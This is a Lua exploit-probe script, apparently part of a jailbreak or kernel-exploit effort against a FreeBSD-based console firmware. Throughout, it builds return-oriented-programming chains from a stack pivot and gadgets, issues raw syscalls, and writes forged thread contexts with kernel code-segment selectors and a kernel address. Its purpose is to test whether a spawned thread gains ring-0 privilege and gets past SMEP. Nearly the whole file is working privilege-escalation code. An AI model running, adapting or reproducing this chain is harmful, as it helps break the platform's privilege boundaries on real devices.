-- CRASH_CLASS: HIGH
-- PROBE 1008a: what privilege level does the thr_create context actually run at?
--
-- 189a recorded a live thread when the context carried CS=0x40 (index 8, RPL 0) and
-- concluded the firmware replaces the selector. That was never measured at the CPU.
-- The discriminator: SMEP. At CPL3 a user gadget executes normally; at CPL0 the same
-- fetch faults with the #PF error word bit 4 (I/D) set and P=1, which the handler dump
-- exposes. A control with CS=0x43 must read a known user value first, so a dead chain
-- cannot be mistaken for a privilege result.

local KADDR = 0xFFFFFFFFD8000000
local CS_CASES = { 0x43, 0x40, 0x00 }

print("=== PROBE 1008a: CPL TEST ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return tostring(v) end return "?" end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end
local function A(x) local ok,v=pcall(function() return as_addr(x) end) if ok and v and v>0 then return v end return 0 end

print(string.format("[0] pid=%u fd=%u", to_num(mk(20)()), rd(signal.fd_addr) or 0))

local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local hc = ropchain({ stack_base = to_num(ph.pivot_addr) })
hc:push_store_rdx_into_memory(ctxt)
hc:push_syscall_raw(syscall.write, function()
    hc:push_set_rdx(0x40)
    hc:push_set_rax_from_memory(ctxt)
    hc:push_add_to_rax(0x100)
    hc:push_set_reg_from_rax("rsi")
    hc:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
hc:push_syscall_raw(mk(431), function() hc:push_set_rdi(0) end)

local pop_rax = A(gadgets["pop rax; ret"])
local ld_rax  = A(gadgets["mov rax, [rax]; ret"])
local pop_rdi = A(gadgets["pop rdi; ret"])
local st_rdi  = A(gadgets["mov [rdi], rax; ret"])
print(string.format("[1] pop_rax=0x%X ld=0x%X pop_rdi=0x%X st=0x%X", pop_rax, ld_rax, pop_rdi, st_rdi))

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local out  = mmap(page)
local src  = mmap(page)
local ctx  = memory.alloc(0x500)
local tb   = memory.alloc(8)
local ts   = memory.alloc(16)
local ctxa = as_addr(ctx)
wq(src, 0xCAFEBABE)
print(string.format("[2] out=0x%X src=0x%X ctx=0x%X src_val=%s", out, src, ctxa, rq(src)))

local function run(tag, cs, target, rip)
    local stack = mmap(page)
    -- RIP starts at pop_rax, so the stack begins with its operand.
    local ch = { target, ld_rax, pop_rdi, out, st_rdi, ld_rax }
    for k=1,#ch do wq(stack+(k-1)*8, ch[k]) end
    wq(out, 0xDEADBEEF)
    for o=0,0x4F8,8 do wq(ctxa+o,0) end
    wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000)
    wq(ctxa+Ctx.CS,cs); wq(ctxa+Ctx.SS,0x3B)
    wq(ctxa+Ctx.RIP,rip); wq(ctxa+Ctx.RSP,stack)
    wq(as_addr(tb),0)
    print(string.format("[%s] cs=0x%X target=0x%X rip=0x%X", tag, cs, target, rip))
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
    print(string.format("[%s] spawn ok=%s rv=%s", tag, tostring(ok), ok and tostring(to_num(rv)) or ""))
    wq(as_addr(ts),0); wq(as_addr(ts)+8,250*1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
    print(string.format("[%s] out=%s alive pid=%u", tag, rq(out), to_num(mk(20)())))
end

run("C1", CS_CASES[1], src, pop_rax)
run("C2", CS_CASES[2], src, pop_rax)
run("C3", CS_CASES[3], src, pop_rax)
run("K1", CS_CASES[2], KADDR, pop_rax)
print("=== COMPLETE ===")
